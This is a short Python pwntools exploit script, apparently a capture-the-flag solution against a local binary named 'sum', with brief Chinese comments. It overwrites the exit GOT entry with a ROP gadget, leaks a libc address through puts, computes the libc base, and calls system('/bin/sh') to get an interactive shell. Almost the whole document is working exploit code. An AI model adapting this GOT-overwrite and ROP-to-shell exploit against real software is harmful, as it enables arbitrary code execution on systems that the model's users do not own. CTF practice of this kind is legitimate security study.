#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

r = process('./sum')
elf = ELF('./sum')
libc = ELF('./libc.so')

exit_got = elf.got[b'exit']
puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = elf.symbols[b'main']
pop_rdi_ret = 0x400a43
ret = 0x4005ee

padd = 0x601500 # for nothing

'''
參數要大於五個 -> exit()
參數是放在stack上，且剛好在ret address附近
xxx_got = 1+2+3+4+5+xxx_got 
'''

r.recvuntil('2 3 4 0\n')

'''
exit_got 改寫成 pop_rdi_ret，
所以只要stack上的ROP寫得好就可以
控制程式流程。
'''
r.sendline('{} {} {} {} {} {}'.format(main, -main, pop_rdi_ret - exit_got, 
                                         1, -1, exit_got)) # main loop

'''
ROP leak libc
'''
r.recvuntil('2 3 4 0\n')
r.sendline('{} {} {} {} {} {}'.format(ret, pop_rdi_ret, puts_got, puts_plt, main, padd))
libc_base = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00')) - libc.symbols[b'puts'] - 0x70
print('[*] libc_base : ', hex(libc_base))

system = libc_base + libc.symbols[b'system'] + 0xa0
binsh = libc_base + 0x1b40fa
print(hex(binsh))


r.recvuntil('2 3 4 0\n')
r.sendline('{} {} {} {} {} {}'.format(pop_rdi_ret, binsh, system, 1, 1, padd))

r.interactive()
